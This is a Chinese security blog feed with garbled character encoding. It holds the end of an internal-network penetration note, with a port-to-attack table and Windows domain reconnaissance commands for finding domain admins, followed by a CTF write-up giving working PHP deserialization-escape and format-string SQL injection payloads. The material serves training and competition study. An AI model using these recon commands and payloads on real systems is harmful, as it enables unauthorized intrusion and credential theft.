<td>çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤\è®¤è¯ç»•è¿‡</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>çˆ†ç ´\æ³¨å…¥</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>ç¼“å†²åŒºæº¢å‡º\æ³¨å…¥æ”»å‡»\çˆ†ç ´ï¼šå¼±å£ä»¤</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>æ‹’ç»æœåŠ¡\ä»£ç æ‰§è¡Œï¼ŒæŠ“å–å¯†ç </td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>çˆ†ç ´ï¼šå¼±å£ä»¤\è®¤è¯ç»•è¿‡</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>æœªæˆæƒè®¿é—®\çˆ†ç ´ï¼šå¼±å£ä»¤</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td>Javaååºåˆ—åŒ–\æ§åˆ¶å°å¼±å£ä»¤\æ§åˆ¶å°éƒ¨ç½²webshell</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ\SQLæ³¨å…¥</td>
</tr>
<tr>
<td>8080/8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td>
</tr>
<tr>
<td>9090</td>
<td>websphereæ§åˆ¶å°</td>
<td>çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤\Javaååºåˆ—</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>è¿œç¨‹ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td>10000</td>
<td>webminæ§åˆ¶é¢æ¿</td>
<td>å¼±å£ä»¤</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td>çˆ†ç ´\æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>è¿œç¨‹æ‰§è¡Œ</td>
</tr>
</tbody></table>
</blockquote>
<h2 id="è·å–åŸŸå†…çš„åŸºç¡€ä¿¡æ¯"><a href="#è·å–åŸŸå†…çš„åŸºç¡€ä¿¡æ¯" class="headerlink" title="è·å–åŸŸå†…çš„åŸºç¡€ä¿¡æ¯"></a>è·å–åŸŸå†…çš„åŸºç¡€ä¿¡æ¯</h2><h3 id="æŸ¥è¯¢åŸŸ"><a href="#æŸ¥è¯¢åŸŸ" class="headerlink" title="æŸ¥è¯¢åŸŸ"></a>æŸ¥è¯¢åŸŸ</h3><ul>
<li>net view /domain  ç”¨æ¥æŸ¥è¯¢å½“å‰ç¯å¢ƒå­˜åœ¨å‡ ä¸ªåŸŸ</li>
</ul>
<p>de1taé¶æœºæŠ¥é”™ï¼Œ<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">å‚è€ƒå…ˆçŸ¥å›¾ç‰‡</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114253-83737004-8514-1.png" alt="img" style="zoom: 200%;">

<h3 id="æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº"><a href="#æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº" class="headerlink" title="æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº"></a>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº</h3><ul>
<li>net view /domain:åŸŸå</li>
</ul>
<p>de1taé¶æœºæŠ¥é”™ï¼Œ<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">å‚è€ƒå…ˆçŸ¥å›¾ç‰‡</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114325-95fac128-8514-1.png" alt="img" style="zoom:200%;">

<h3 id="æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„"><a href="#æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„" class="headerlink" title="æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„"></a>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„</h3><ul>
<li>net group /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505101849441.png" alt="image-20200505101849441" style="zoom:150%;">

<h3 id="æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨"><a href="#æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨" class="headerlink" title="æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨"></a>æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨</h3><ul>
<li>net  group â€œdomain computersâ€ /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505141419870.png" alt="image-20200505141419870" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114350-a50c7288-8514-1.png" alt="img" style="zoom:200%;">

<h3 id="è·å–åŸŸå¯†ç ä¿¡æ¯"><a href="#è·å–åŸŸå¯†ç ä¿¡æ¯" class="headerlink" title="è·å–åŸŸå¯†ç ä¿¡æ¯"></a>è·å–åŸŸå¯†ç ä¿¡æ¯</h3><ul>
<li>net accounts /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103458760.png" alt="image-20200505103458760" style="zoom:150%;">

<h3 id="è·å–åŸŸä¿¡ä»»ä¿¡æ¯"><a href="#è·å–åŸŸä¿¡ä»»ä¿¡æ¯" class="headerlink" title="è·å–åŸŸä¿¡ä»»ä¿¡æ¯"></a>è·å–åŸŸä¿¡ä»»ä¿¡æ¯</h3><ul>
<li>nltest /domain_trusts</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103739277.png" alt="image-20200505103739277" style="zoom:200%;">

<h2 id="å¯»æ‰¾åŸŸæ§"><a href="#å¯»æ‰¾åŸŸæ§" class="headerlink" title="å¯»æ‰¾åŸŸæ§"></a>å¯»æ‰¾åŸŸæ§</h2><h3 id="æŸ¥çœ‹åŸŸæ§æœºå™¨å"><a href="#æŸ¥çœ‹åŸŸæ§æœºå™¨å" class="headerlink" title="æŸ¥çœ‹åŸŸæ§æœºå™¨å"></a>æŸ¥çœ‹åŸŸæ§æœºå™¨å</h3><ul>
<li>nltest /DCLIST:åŸŸå  </li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505103955222.png" alt="image-20200505103955222" style="zoom:200%;">

<h3 id="æŸ¥çœ‹åŸŸæ§ä¸»æœºå"><a href="#æŸ¥çœ‹åŸŸæ§ä¸»æœºå" class="headerlink" title="æŸ¥çœ‹åŸŸæ§ä¸»æœºå"></a>æŸ¥çœ‹åŸŸæ§ä¸»æœºå</h3><ul>
<li>nslookup -type=SRV _ladp._tcp</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104206938.png" alt="image-20200505104206938" style="zoom:150%;">

<h3 id="æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„"><a href="#æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„" class="headerlink" title="æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„"></a>æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„</h3><ul>
<li>net  group â€œDomain Controllersâ€  /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104348725.png" alt="image-20200505104348725" style="zoom:150%;">

<ul>
<li>netdom query pdc</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104452989.png" alt="image-20200505104452989" style="zoom:200%;">

<h2 id="è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"><a href="#è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯" class="headerlink" title="è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯"></a>è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯</h2><h3 id="æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨"><a href="#æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨" class="headerlink" title="æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨"></a>æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨</h3><ul>
<li>net user /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505104604612.png" alt="image-20200505104604612" style="zoom:150%;">

<h3 id="è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"><a href="#è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"></a>è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</h3><ul>
<li>wmic useraccount get /all</li>
</ul>
<p>å¯ä»¥æŸ¥è¯¢åˆ°sid</p>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200507155219302.png" alt="image-20200507155219302"></p>
<h3 id="æŸ¥è¯¢å­˜åœ¨çš„ç”¨æˆ·"><a href="#æŸ¥è¯¢å­˜åœ¨çš„ç”¨æˆ·" class="headerlink" title="æŸ¥è¯¢å­˜åœ¨çš„ç”¨æˆ·"></a>æŸ¥è¯¢å­˜åœ¨çš„ç”¨æˆ·</h3><ul>
<li>dsquery user</li>
</ul>
<p>de1taé¶æœºæŠ¥é”™ï¼Œ<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">å‚è€ƒå…ˆçŸ¥å›¾ç‰‡</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114528-df6fb5a2-8514-1.png" alt="img" style="zoom:200%;">

<p>æœ¬åœ°dsqueryå‘½ä»¤ä¸å­˜åœ¨</p>
<h2 id="æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·"><a href="#æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·" class="headerlink" title="æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·"></a>æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç»„ç”¨æˆ·</h2><ul>
<li>net localgroup administrators</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505105728041.png" alt="image-20200505105728041" style="zoom:200%;">

<h2 id="æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„"><a href="#æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„" class="headerlink" title="æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„"></a><strong>æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„</strong></h2><ul>
<li>net group â€œdomain adminsâ€  /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505105826739.png" alt="image-20200505105826739" style="zoom:200%;">

<h2 id="æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„"><a href="#æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„" class="headerlink" title="æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„"></a>æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„</h2><ul>
<li>net  group  â€œEnterprise Adminsâ€ /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505110038499.png" alt="image-20200505110038499" style="zoom:200%;">

<h2 id="å®šä½åŸŸç®¡ç†å‘˜"><a href="#å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="å®šä½åŸŸç®¡ç†å‘˜"></a>å®šä½åŸŸç®¡ç†å‘˜</h2><blockquote>
<p>å¸¸è§„æ¸ é“æœ‰äºŒä¸ªï¼Œæ—¥å¿—ä¸ä¼šè¯ï¼Œæ—¥å¿—æ˜¯æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜æ—¥å¿—ï¼Œå¯ä»¥ç”¨è„šæœ¬æˆ–è€…å†…ç½®åº”ç”¨wevtutilå¯¼å‡ºæ¥çœ‹<br>### å·¥å…·<br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">psloggedon.exe</a>ï¼Œ<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">netview.exe</a>ï¼Œ<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">PVEFindADUser.exe</a>ï¼Œpowersploitçš„PowerViewè„šæœ¬ï¼ŒEmpireçš„user_hunteræ¨¡å—ç­‰</p>
</blockquote>
<h2 id="æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"><a href="#æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹" class="headerlink" title="æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"></a>æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</h2><h3 id="åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·"><a href="#åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·" class="headerlink" title="åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·"></a>åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·</h3><ul>
<li>tasklist /v</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505110813873.png" alt="image-20200505110813873"></p>
<blockquote>
<p>åœ¨ä»¥ä¸Šè¿›ç¨‹ä¸­å°½é‡æŸ¥æ‰¾åŸŸç®¡ç†å‘˜è¿›ç¨‹æˆ–æ˜¯ä¸å…¶ç›¸å…³çš„è¿›ç¨‹</p>
</blockquote>
<h2 id="æŸ¥æ‰¾åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯"><a href="#æŸ¥æ‰¾åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯" class="headerlink" title="æŸ¥æ‰¾åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯"></a>æŸ¥æ‰¾åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯</h2><blockquote>
<p>æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨ï¼š<code>NetSess -h</code>ï¼Œä½¿ç”¨çš„æ˜¯<a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">NetSess.exe</a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200423114153-5f44aee6-8514-1.png" target="_blank" rel="noopener"><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114153-5f44aee6-8514-1.png" alt="img"></a><br>ç›®å‰è¿˜æ²¡æœ‰ä»»ä½•ä¼šè¯ï¼Œæ‰€ä»¥æ˜¾ç¤ºæ— </p>
</blockquote>
<blockquote>
<ul>
<li>## åˆ©ç”¨powershellæ”¶é›†åŸŸä¿¡æ¯</li>
</ul>
<p>é¦–å…ˆè¦å°†powershellçš„æƒé™é™åˆ¶æ›´æ”¹ä¸º<strong>RemoteSigned</strong>ï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œæœ¬åœ°ä¸Šçš„è„šæœ¬</p>
<p>è¾“å…¥ï¼š<code>Get-ExecutionPolicy</code>ï¼Œå‘ç°è‡ªå·±å¹¶ä¸æ˜¯RemoteSignedæƒé™ï¼Œè¾“å…¥ï¼š<code>Set-ExecutionPolicy RemoteSigned</code>ï¼ŒæŒ‰Yç¡®å®šå³å¯ï¼Œåœ¨æœ¬åœ°è™šæ‹Ÿæœºæµ‹è¯•æ—¶è¿˜å¯ä»¥å°†è„šæœ¬æƒé™æ”¹ä¸º<strong>Unrestricter</strong>ï¼Œè¿™æ ·å¯ä»¥æ‰§è¡Œæ¥è‡ªç½‘ç»œä¸æœ¬åœ°çš„ä»»ä½•è„šæœ¬</p>
<p>æ­¤å¤„è¦ä½¿ç”¨çš„è„šæœ¬åœ¨PowerSploit/Reconä¸­ï¼Œå°†è¦ç”¨åˆ°çš„PowerView.ps1ä¼ å…¥é¶æœºï¼Œåœ¨powershellä¸­æ‰“å¼€è¯¥è„šæœ¬ç›®å½•å¹¶å¯¼å…¥ï¼š<code>Import-Module .\PowerView.ps1</code>å°±å¯ä»¥è¿›è¡Œæ”¶é›†äº†</p>
<p>å…·ä½“å‘½ä»¤çš„ç›¸å…³ç”¨æ³•åœ¨<code>PowerSploit/Recon/READE.md</code>ä¸­</p>
</blockquote>
<h1 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\\\åŸŸæ§(å¦‚pc.xx.com) password &#x2F;user:xxx.com\username ç›¸å½“äºè¿™ä¸ªå¸å·ç™»å½•åŸŸå†…ä¸»æœºï¼Œå¯è®¿é—®èµ„æº</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å¹´å®‰æ’å››æœˆæœˆèµ›</title>
    <url>/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<p>æ¯”èµ›æ—¶åªåšå‡ºäº†ä¸€ä¸ªwebï¼Œè¿™æ¬¡å®‰æ’æœˆèµ›è´¨é‡å¾ˆå¥½ï¼Œè¿˜æä¾›äº†å¤ç°ğŸ‘ğŸ‘ğŸ‘</p>
<a id="more"></a>

<h1 id="0x01-Ezunserialize"><a href="#0x01-Ezunserialize" class="headerlink" title="0x01 Ezunserialize"></a>0x01 Ezunserialize</h1><p>è€ƒç‚¹ :å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—åŒ–</p>
<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰æ›´åƒæ˜¯ä¸€é“è®¡ç®—é¢˜ï¼Œé‡ç‚¹æ˜¯å› ä¸ºåœ¨readçš„æ—¶å€™ä¼šæŠŠ<code>\0\0\0</code>====&gt;<code>chr(0) . &#39;*&#39; . chr(0)</code></p>
<p>è¿™æ ·é•¿åº¦å°±ä¼šå˜çŸ­ï¼Œ</p>
<p>æ­£å¸¸çš„Aç±»çš„åºåˆ—åŒ–ç»“æœåº”ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:8:&quot;mount4in&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å­—ç¬¦çš„é€ƒé€¸å¯ä»¥å°†åºåˆ—åŒ–ç»“æœæ”¹å˜æˆç±»ä¼¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:8:&quot;mount4in&quot;;s:2:&quot;st&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¯»å–flag.phpã€‚</p>
<p>ç„¶åå°±æ˜¯æ•°å­¦çš„è®¡ç®—ã€‚é€šè¿‡åœ¨usernameä¸­æ·»åŠ \0\0\0,åœ¨passwordä¸­æ·»åŠ payload,é€šè¿‡ä¸€ä¸ª<code>\0\0\0</code>ä¼šåƒæ‰ä¸‰ä¸ªä¸‰ä¸ªå­—ç¬¦ï¼Œæœ€åæ”¹å˜åºåˆ—åŒ–å†…å®¹ä¸ºå¯è§¦å‘è¯»æ–‡ä»¶çš„payloadã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:53:&quot;admin\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:68:&quot;&quot;&quot;;s:2:&quot;st&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501182039560.png" alt="image-20200501182039560" style="zoom:200%;">

<p>ä¼ å…¥è¿™ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> A(<span class="string">"admin\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"</span>, <span class="string">'"";s:2:"st";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:8:"flag.php";&#125;&#125;&#125;'</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501182343230.png" alt="image-20200501182343230"></p>
<h1 id="0x02-babytricks"><a href="#0x02-babytricks" class="headerlink" title="0x02 babytricks"></a>0x02 babytricks</h1><p>æ‰«ç›®å½•</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185458689.png" alt="image-20200501185458689"></p>
<p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501183423342.png" alt="image-20200501183423342"></p>
<p>åº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¼è‡´çš„sqlæ³¨å…¥ï¼Œ</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185254219.png" alt="image-20200501185254219"></p>
<p>ä¹Ÿå¯ä»¥user=admin%1$c#&amp;passwd=39</p>
<p>user=%1$&amp;passwd=^0#</p>
<p>ä¸çŸ¥é“ä¸ºå•¥æ²¡å‡ºå¯†ç ï¼Œç”¨ä¸‹åˆ«äººçš„å§ã€‚</p>
<p>æ›´æ–°ï¼šæ¯”èµ›æ—¶æ˜¯éé¢„æœŸï¼Œéœ€è¦ç”¨betweenç›²æ³¨ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%1$c+0 adn passwd between CONCAT(&quot;&#123;&#125;&quot;,BINARY(&quot;&quot;)) and CONCAT(&quot;&#123;&#125;&quot;,BINARY(&quot;&quot;)) #</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">Â Â Â Â [0]Â &#x3D;&gt;Â 1</span><br><span class="line">Â Â Â Â [id]Â &#x3D;&gt;Â 1</span><br><span class="line">Â Â Â Â [1]Â &#x3D;&gt;Â admin</span><br><span class="line">Â Â Â Â [user]Â &#x3D;&gt;Â admin</span><br><span class="line">Â Â Â Â [2]Â &#x3D;&gt;Â GoODLUcKcTFer202OHAckFuN</span><br><span class="line">Â Â Â Â [passwd]Â &#x3D;&gt;Â GoODLUcKcTFer202OHAckFuN</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ç„¶åadmin/index.phpç™»è¿›åå°ï¼Œ</p>
